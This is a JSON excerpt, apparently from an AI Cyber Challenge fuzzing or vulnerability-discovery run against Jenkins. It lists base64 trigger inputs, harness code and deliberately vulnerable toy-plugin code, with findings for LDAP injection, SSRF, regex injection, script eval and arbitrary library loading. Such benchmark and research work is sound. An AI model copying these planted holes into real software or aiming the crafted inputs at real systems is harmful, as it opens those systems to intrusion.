                "AAAAJioAKgBpcnJlbGV2YW50AGlycmVsZXZhbnQA"
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n206       void testStateMonitor(ByteBuffer buf) {\n207           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n208           if (parts.length != 4) {\n209               return;\n210           }\n211   \n212           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n213           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n214           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n215           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n216           try {\n217               new StateMonitor().doCheck(req, rsp);\n218           } catch (Exception e) {\n219           }\n220       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:\n35       @RequirePOST\n36       public void doCheck(StaplerRequest request, StaplerResponse response) throws Exception {\n37           if (!request.hasParameter(\"name\") || !request.hasParameter(\"password\")) {\n38               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n39               return;\n40           }\n41   \n42           String name = request.getParameter(\"name\");\n43           String password = request.getParameter(\"password\");\n44           String pattern = \"^[a-zA-Z]+$\";\n45           if (!name.matches(pattern) &&\n46                   !password.matches(pattern)) {\n47               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n48               return;\n49           }\n50   \n51           if (name.equals(\"admin\")) {\n52               if (password.equals(\"nimda\")) {\n53                   response.setContentType(\"application/json\");\n54                   response.setCharacterEncoding(\"UTF-8\");\n55                   response.getWriter().write(\"{\\\"status\\\": \\\"\" + state + \"\\\"}\");\n56                   return;\n57               } else {\n58                   logger.error(password);\n59                   response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n60                   return;\n61               }\n62           } else {\n63               logger.error(\"There are failed attempt.\");\n64               response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n65               return;\n66           }\n67       }\n",
            "cost": 0.37268,
            "harness_id": "id_3",
            "sanitizer": "Regular Expression Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:46:35",
            "status": "corpus",
            "valid_path": "YES",
            "id": 30
        },
        {
            "blob": [
                "AAAAvnVzZXJuYW1lAChhZG1pbikAa2V5AGlycmVsZXZhbnQ="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n235       void testAuthAction(ByteBuffer buf) {\n236           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n237           if (parts.length != 4) {\n238               return;\n239           }\n240   \n241           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n242           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n243           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n244           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n245   \n246           AuthAction action = new AuthAction();\n247           try {\n248               action.authenticateAsAdmin(req, rsp);\n249           } catch (IOException | NamingException e) {}\n250       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java:\n206       @RequirePOST\n207       public void authenticateAsAdmin(StaplerRequest request, StaplerResponse response)\n208               throws IOException, NamingException {\n209           if (!request.hasParameter(\"username\") || !request.hasParameter(\"key\")) {\n210               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n211               return;\n212           }\n213           String username = request.getParameter(\"username\");\n214           String key = request.getParameter(\"key\");\n215           response.setContentType(\"application/json\");\n216           PrintWriter writer = response.getWriter();\n217   \n218           DirContext dirContext = null;\n219           try {\n220               dirContext = new InitialDirContext(getDefaultEnv());\n221               SearchControls controls = new SearchControls();\n222               controls.setSearchScope(SearchControls.SUBTREE_SCOPE);\n223               controls.setReturningAttributes(new String[] { \"cn\" });\n224               if (!isAdmin(dirContext, controls, username)) {\n225                   writer.print(\"{\\\"status\\\": \\\"failure\\\"}\");\n226                   return;\n227               }\n228               String searchFilter = \"(&(objectClass=inetOrgPerson)(cn=\" + username + \")(userPassword=\" + key + \"))\";\n229               NamingEnumeration<SearchResult> results = dirContext.search(\"ou=users,dc=example,dc=com\", searchFilter,\n230                       controls);\n231               if (results.hasMore()) {\n232                   writer.print(\"{\\\"status\\\": \\\"success\\\"}\");\n233               } else {\n234                   writer.print(\"{\\\"status\\\": \\\"failure\\\"}\");\n235               }\n236           } catch (NamingException e) {\n237               response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n238           }\n239           if (dirContext != null) {\n240               try {\n241                   dirContext.close();\n242               } catch (NamingException e) {\n243               }\n244           }\n245       }\n",
            "cost": 0.37285499999999994,
            "harness_id": "id_3",
            "sanitizer": "LDAP Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java:229:103",
            "status": "corpus",
            "valid_path": "YES",
            "id": 31
        },
        {
            "blob": [
                "AAAAJm5hbWUAYWRtaW4qAHBhc3N3b3JkAG5pbWRhKg=="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n206       void testStateMonitor(ByteBuffer buf) {\n207           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n208           if (parts.length != 4) {\n209               return;\n210           }\n211   \n212           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n213           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n214           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n215           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n216           try {\n217               new StateMonitor().doCheck(req, rsp);\n218           } catch (Exception e) {\n219           }\n220       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:\n35       @RequirePOST\n36       public void doCheck(StaplerRequest request, StaplerResponse response) throws Exception {\n37           if (!request.hasParameter(\"name\") || !request.hasParameter(\"password\")) {\n38               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n39               return;\n40           }\n41   \n42           String name = request.getParameter(\"name\");\n43           String password = request.getParameter(\"password\");\n44           String pattern = \"^[a-zA-Z]+$\";\n45           if (!name.matches(pattern) &&\n46                   !password.matches(pattern)) {\n47               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n48               return;\n49           }\n50   \n51           if (name.equals(\"admin\")) {\n52               if (password.equals(\"nimda\")) {\n53                   response.setContentType(\"application/json\");\n54                   response.setCharacterEncoding(\"UTF-8\");\n55                   response.getWriter().write(\"{\\\"status\\\": \\\"\" + state + \"\\\"}\");\n56                   return;\n57               } else {\n58                   logger.error(password);\n59                   response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n60                   return;\n61               }\n62           } else {\n63               logger.error(\"There are failed attempt.\");\n64               response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n65               return;\n66           }\n67       }\n",
            "cost": 0.36839,
            "harness_id": "id_3",
            "sanitizer": "Regular Expression Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java:45:27",
            "status": "corpus",
            "valid_path": "YES",
            "id": 32
        },
        {
            "blob": [
                "AAAAC25hbWUAcHJveHluYW1lAHBvcnQAODA4MABodHRwOi8vamF6emVyLmV4YW1wbGUuY29t"
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 60       public static void fuzzerInitialize() throws Throwable {\n 61           jenkins = Mockito.mock(Jenkins.class);\n 62   \n 63           replacer = new StaplerReplacer();\n 64           replacer.setWebApp(new WebApp(Mockito.mock(ServletContext.class)));\n 65   \n 66           rsp = Mockito.mock(ResponseImpl.class);\n 67           StringWriter sw = new StringWriter();\n 68           PrintWriter pw = new PrintWriter(sw);\n 69           when(rsp.getWriter()).thenReturn(pw);\n 70   \n 71           secretMessage = new SecretMessage();\n 72           manager = PluginManager.createDefault(jenkins);\n 73       }\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n126       void testProxyConfiguration(ByteBuffer buf) throws Exception {\n127           Authentication a = Mockito.mock(Authentication.class);\n128           when(a.getName()).thenReturn(\"mock\");\n129   \n130           Jenkins j = Mockito.mock(Jenkins.class);\n131           doThrow(new AccessDeniedException3(a, Jenkins.ADMINISTER))\n132               .when(j)\n133               .checkPermission(Jenkins.ADMINISTER);\n134   \n135           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n136           if (parts.length != 5) {\n137               return;\n138           }\n139   \n140           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n141           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n142           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n143           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n144           try {\n145               new ProxyConfiguration.DescriptorImpl2(j).doValidateProxy(parts[4], req, rsp);\n146           } catch (AccessDeniedException3 | InterruptedException e) {}\n147       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/jenkins/core/src/main/java/hudson/ProxyConfiguration.java:\n527           @RequirePOST\n528           @Restricted(NoExternalUse.class)\n529           public FormValidation doValidateProxy(\n530               @QueryParameter(\"testUrl\") String testUrl,\n531               StaplerRequest request,\n532               StaplerResponse response) throws InterruptedException {\n533   \n534               testUrl = Util.fixEmptyAndTrim(testUrl);\n535               if (testUrl == null) {\n536                   return FormValidation.error(Messages.ProxyConfiguration_TestUrlRequired());\n537               }\n538               URI uri;\n539               try {\n540                   uri = new URI(testUrl);\n541               } catch (URISyntaxException e) {\n542                   return FormValidation.error(e, Messages.ProxyConfiguration_MalformedTestUrl(testUrl));\n543               }\n544               HttpClient.Builder builder = HttpClient.newBuilder();\n545               builder.connectTimeout(DEFAULT_CONNECT_TIMEOUT_MILLIS > 0\n546                       ? Duration.ofMillis(DEFAULT_CONNECT_TIMEOUT_MILLIS)\n547                       : Duration.ofSeconds(30));\n548   \n549               if (!request.hasParameter(\"name\")) {\n550                   return FormValidation.error(\"Missing parameter [name]\");\n551               }\n552   \n553               if (!request.hasParameter(\"port\")) {\n554                   return FormValidation.error(\"Missing parameter [port]\");\n555               }\n556   \n557               String name = request.getParameter(\"name\");\n558               int port = -1;\n559               try {\n560                   port = Integer.parseInt(request.getParameter(\"port\"));\n561               } catch (NumberFormatException e) {\n562                   return FormValidation.error(\"Invalid value for parameter [port]\");\n563               }\n564   \n565               String noProxyHost = null;\n566               if (request.hasParameter(\"noproxyhost\")) {\n567                   noProxyHost = request.getParameter(\"noproxyhost\");\n568               }\n569   \n570               String userName = null;\n571               if (request.hasParameter(\"username\")) {\n572                   userName = request.getParameter(\"username\");\n573               }\n574   \n575               Secret password = null;\n576   \n577               if (Util.fixEmptyAndTrim(name) != null &&\n578                   !isNoProxyHost(uri.getHost(), noProxyHost)) {\n579                   builder.proxy(ProxySelector.of(new InetSocketAddress(name, port)));\n580                   Authenticator authenticator = newValidationAuthenticator(userName, password != null ? password.getPlainText() : null);\n581                   builder.authenticator(authenticator);\n582               }\n583               HttpClient httpClient = builder.build();\n584               HttpRequest httpRequest;\n585               try {\n586                   httpRequest = ProxyConfiguration.newHttpRequestBuilder(uri)\n587                           .method(\"HEAD\", HttpRequest.BodyPublishers.noBody())\n588                           .build();\n589               } catch (IllegalArgumentException e) {\n590                   return FormValidation.error(e, Messages.ProxyConfiguration_MalformedTestUrl(testUrl));\n591               }\n592               try {\n593                   HttpResponse<Void> httpResponse = httpClient.send(httpRequest, HttpResponse.BodyHandlers.discarding());\n594                   if (httpResponse.statusCode() == HttpURLConnection.HTTP_OK) {\n595                       return FormValidation.ok(Messages.ProxyConfiguration_Success());\n596                   }\n597                   return FormValidation.error(Messages.ProxyConfiguration_FailedToConnect(testUrl, httpResponse.statusCode()));\n598               } catch (IOException e) {\n599                   return FormValidation.error(e, Messages.ProxyConfiguration_FailedToConnectViaProxy(testUrl));\n600               }\n601           }\n",
            "cost": 0.42410499999999995,
            "harness_id": "id_3",
            "sanitizer": "Server Side Request Forgery (SSRF)",
            "sink": "src/jenkins/core/src/main/java/hudson/ProxyConfiguration.java:593:67",
            "status": "corpus",
            "valid_path": "YES",
            "id": 33
        },
        {
            "blob": [
                "AAAA0WNtZAAxAG1zZwBkR1Z6ZEE9PQBsaWIAamF6emVyX2hvbmV5cG90AGZyZWVsb2FkAHRydWUAZXh0cmExAGV4dHJhMg=="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n266       void testSecretMessage(ByteBuffer buf) {\n267           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n268           if (parts.length != 8) {\n269               return;\n270           }\n271   \n272           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n273           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n274           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n275           when(innerReq.getParameter(parts[4])).thenReturn(parts[5]);\n276           when(innerReq.getParameter(parts[6])).thenReturn(parts[7]);\n277           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n278           when(jenkins.hasPermission(Jenkins.ADMINISTER)).thenReturn(false);\n279           secretMessage.setJenkins(jenkins);\n280           try {\n281               secretMessage.doPerform(req, rsp);\n282           } catch (IOException e) {}\n283       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/SecretMessage.java:\n 58       public void doPerform(StaplerRequest request, StaplerResponse response) throws IOException {\n 59           if (!request.hasParameter(\"cmd\") ||\n 60                   !request.hasParameter(\"msg\") ||\n 61                   !request.hasParameter(\"lib\")) {\n 62               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 63               return;\n 64           }\n 65   \n 66           int cmd = 0;\n 67           try {\n 68               cmd = Integer.parseInt(request.getParameter(\"cmd\"));\n 69           } catch (NumberFormatException e) {\n 70               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 71               return;\n 72           }\n 73   \n 74           String msg = null;\n 75           try {\n 76               msg = new String(Base64.getDecoder().decode(request.getParameter(\"msg\")));\n 77           } catch (IllegalArgumentException e) {\n 78               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 79               return;\n 80           }\n 81           String lib = request.getParameter(\"lib\");\n 82           if (lib.contains(\"..\")) {\n 83               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 84               return;\n 85           }\n 86           boolean freeload = false;\n 87           boolean admin = getJenkins().hasPermission(Jenkins.ADMINISTER);\n 88           if (admin || request.hasParameter(\"freeload\")) {\n 89               freeload = Boolean.parseBoolean(request.getParameter(\"freeload\"));\n 90           }\n 91           if (Paths.get(lib).isAbsolute() && !freeload) {\n 92               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n 93               return;\n 94           }\n 95   \n 96           String path = freeload ? lib : Paths.get(System.getProperty(\"user.dir\"), lib).toString();\n 97           try {\n 98               Runtime.getRuntime().load(path);\n 99               String result = null;\n100               if (cmd == 1) {\n101                   result = Base64.getEncoder().encodeToString(encrypt(msg).getBytes());\n102               } else if (cmd == 2) {\n103                   result = Base64.getEncoder().encodeToString(decrypt(msg).getBytes());\n104               }\n105   \n106               if (result == null) {\n107                   response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n108                   return;\n109               }\n110               response.setContentType(\"application/json\");\n111               response.getWriter().write(\"{\\\"result\\\": \\\"\" + result + \"\\\"}\");\n112           } catch (UnsatisfiedLinkError e) {\n113               System.out.println(e.getMessage());\n114               response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n115           }\n116       }\n",
            "cost": 0.434755,
            "harness_id": "id_3",
            "sanitizer": "load arbitrary library",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/SecretMessage.java:98:39",
            "status": "corpus",
            "valid_path": "YES",
            "id": 34
        },
        {
            "blob": [
                "AAAAJSIiamF6IisiemVyIiI="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n303       void testScript(ByteBuffer buf) {\n304           when(jenkins.hasPermission(Job.CONFIGURE)).thenReturn(true);\n305           try {\n306               String whole = getRemainingAsString(buf);\n307               new Script(jenkins).doCheckScriptCompile(whole);\n308           } catch (Exception e) {}\n309           when(jenkins.hasPermission(Job.CONFIGURE)).thenReturn(false);\n310   \n311       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Script.java:\n 77       public static void secureEval(final String script, final String forbiddenInstruction, final boolean useReflection) throws Exception {\n 78           final ScriptEngine groovyEngine = new ScriptEngineManager().getEngineByName(\"groovy\");\n 79   \n 80           final GroovySecurityManager groovySecurityManager = GroovySecurityManager.instance();\n 81           groovySecurityManager.overrideGroovyClassLoader(groovyEngine, useReflection);\n 82           groovySecurityManager.forbid(forbiddenInstruction);\n 83   \n 84           groovyEngine.eval(script);\n 85       }\n 87       @RequirePOST\n 88       public boolean doCheckScriptCompile(@QueryParameter String value) throws Exception {\n 89           if (!getJenkins().hasPermission(Job.CONFIGURE)) {\n 90               return true;\n 91           }\n 92           try {\n 93               secureEval(value, \"java.lang.System\", true);\n 94           } catch (ClassCastException | CompilationFailedException x) {\n 95               return false;\n 96           }\n 97           return true;\n 98           // Approval requirements are managed by regular stapler form validation (via doCheckScript)\n 99       }\n",
            "cost": 0.35586499999999993,
            "harness_id": "id_3",
            "sanitizer": "Script Engine Injection",
            "sink": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Script.java:84:27",
            "status": "corpus",
            "valid_path": "YES",
            "id": 35
        },
        {
            "blob": [
                "ARgBaWQAY3JhZnRlZF9pZAAA"
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-four/src/main/java/com/aixcc/jenkins/harnesses/four/JenkinsFour.java:\n 78       public static void fuzzerTestOneInput(byte[] data) throws Throwable {\n 79           try {\n 80               new JenkinsFour().fuzz(data);\n 81           } catch (FuzzerSecurityIssueLow | FuzzerSecurityIssueMedium | FuzzerSecurityIssueHigh\n 82                   | FuzzerSecurityIssueCritical e) {\n 83               throw e;\n 84           } catch (Throwable t) {\n 85           }\n 86       }\n 88       public void fuzz(byte[] data) throws Throwable {\n 89           ByteBuffer buffer = ByteBuffer.wrap(data);\n 90           int numRequests = (int) buffer.get();\n 91           if (numRequests < 0)\n 92               return;\n 93   \n 94           RequestImpl requestImpl = null;\n 95           for (int i = 0; i < numRequests; ++i) {\n 96               int command = (int) buffer.get();\n 97               switch (command) {\n 98                   case 5:\n 99                       requestImpl = createHttpRequest(buffer);\n100                       failureCause = causeManagement.getDynamic(requestImpl.getParameter(\"id\"), requestImpl,\n101                               responseImpl);\n102                       failureCause.setId(\"0\");\n103                       break;\n104                   case 19:\n105                       setPermission((int) buffer.get());\n106                       break;\n107                   case 24:\n108                       requestImpl = createHttpRequest(buffer);\n109                       causeManagement.doRemoveConfirm(requestImpl.getParameter(\"id\"), requestImpl, responseImpl);\n110                       break;\n111                   case 33:\n112                       requestImpl = createHttpRequest(buffer);\n113                       knowledgeBaseDescriptor.doSave(requestImpl);\n114                       break;\n115                   case 59:\n116                       requestImpl = createHttpRequest(buffer);\n117                       failureCause.doConfigSubmit(requestImpl, responseImpl);\n118                       break;\n119                   case 63:\n120                       requestImpl = createHttpRequest(buffer);\n121                       knowledgeBaseDescriptor.doLoad(requestImpl);\n122                       break;\n123                   case 87:\n124                       requestImpl = createHttpRequest(buffer);\n125                       knowledgeBaseDescriptor.doForceUpdate(requestImpl);\n126                       break;\n127                   default:\n128                       break;\n129               }\n130           }\n131       }\n133       private String readStringUntilNullByte(ByteBuffer buffer) {\n134           StringBuilder stringBuilder = new StringBuilder();\n135           while (buffer.hasRemaining()) {\n136               byte b = buffer.get();\n137               if (b == 0x00) {\n138                   break;\n139               }\n140               stringBuilder.append((char) b);\n141           }\n142           return stringBuilder.toString();\n143       }\n145       private RequestImpl createHttpRequest(ByteBuffer buffer) throws Throwable {\n146           HttpSession httpSession = Mockito.mock(HttpSession.class);\n147           HttpServletRequest httpRequest = Mockito.mock(HttpServletRequest.class);\n148           RequestImpl requestImpl = spy(new RequestImpl(replacer.stapler, httpRequest, Collections.emptyList(), null));\n149           when(httpRequest.getSession(anyBoolean())).thenReturn(httpSession);\n150           int numParams = (int) buffer.get();\n151           if (numParams > 0) {\n152               for (int i = 0; i < numParams; ++i) {\n153                   String name = readStringUntilNullByte(buffer);\n154                   String value = readStringUntilNullByte(buffer);\n155                   when(httpRequest.getParameter(name)).thenReturn(value);\n156               }\n157           }\n158           String form = readStringUntilNullByte(buffer);\n159           if (form.length() == 0) {\n160               form = \"{}\";\n161           }\n162           // NOTE: Below is to prevent hang from JSONObject.fromObject.\n163           // JSONObject.fromObject has infinite loop vulnerability when a specific value\n164           // is given.\n165           // int startIndex = form.indexOf(\"/*\", 0);\n166           // while (startIndex != -1) {\n167           // int endIndex = form.indexOf(\"*/\", startIndex+2);\n168           // int starIndex = form.indexOf(\"*\", startIndex+2);\n169           // if ((starIndex < endIndex) || (endIndex == -1)) {\n170           // form = \"{}\";\n171           // break;\n172           // }\n173           // if (endIndex == -1) {\n174           // break;\n175           // }\n176           // startIndex = form.indexOf(\"/*\", endIndex+2);\n177           // }\n178           JSONObject formObject = JSONObject.fromObject(form);\n179           doReturn(formObject).when(requestImpl).getSubmittedForm();\n180           return requestImpl;\n181       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/CauseManagement.java:\n228       public void doRemoveConfirm(@QueryParameter String id, StaplerRequest request, StaplerResponse response)\n229               throws IOException {\n230           boolean hasPermission = Jenkins.getInstance().hasPermission(PluginImpl.REMOVE_PERMISSION);\n231           id = Util.fixEmpty(id);\n232           if (id != null || hasPermission) {\n233               try {\n234                   FailureCause cause = PluginImpl.getInstance().getKnowledgeBase().removeCause(id);\n235                   if (cause != null) {\n236                       try {\n237                           String comment = cause.getComment();\n238                           if (comment.startsWith(\"notice:\")) {\n239                               String addr = comment.substring(comment.indexOf(\":\") + 1);\n240                               HttpClient httpClient = HttpClient.newHttpClient();\n241                               HttpRequest httpRequest = HttpRequest.newBuilder()\n242                                   .uri(new 